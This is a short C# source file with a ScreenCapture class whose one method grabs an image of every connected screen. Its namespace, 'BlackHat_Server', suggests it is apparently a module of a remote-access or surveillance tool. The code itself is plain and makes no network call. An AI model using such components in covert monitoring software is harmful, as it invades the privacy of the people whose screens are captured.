using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace BlackHat_Server.Muduli.Desktop
{
    /// <summary>
    ///     Provides functions to capture the entire screen, or a particular window, and save it to a file.
    /// </summary>
    public class ScreenCapture
    {
        public Bitmap ScreenShot()
        {
            Graphics screenShotGraphics = null;
            try
            {
                var totalSize = Rectangle.Empty;

                foreach (var s in Screen.AllScreens)
                    totalSize = Rectangle.Union(totalSize, s.Bounds);

                var screenShotBMP = new Bitmap(totalSize.Width, totalSize.Height, PixelFormat.Format32bppArgb);


                screenShotGraphics = Graphics.FromImage(screenShotBMP);

                screenShotGraphics.CopyFromScreen(totalSize.X, totalSize.Y,
                    0, 0, totalSize.Size, CopyPixelOperation.SourceCopy);

                screenShotGraphics.Dispose();


                return screenShotBMP;
            }
            catch (Exception)
            {
                if (screenShotGraphics != null)
                    screenShotGraphics.Dispose();

                return null;
            }
        }
    }
}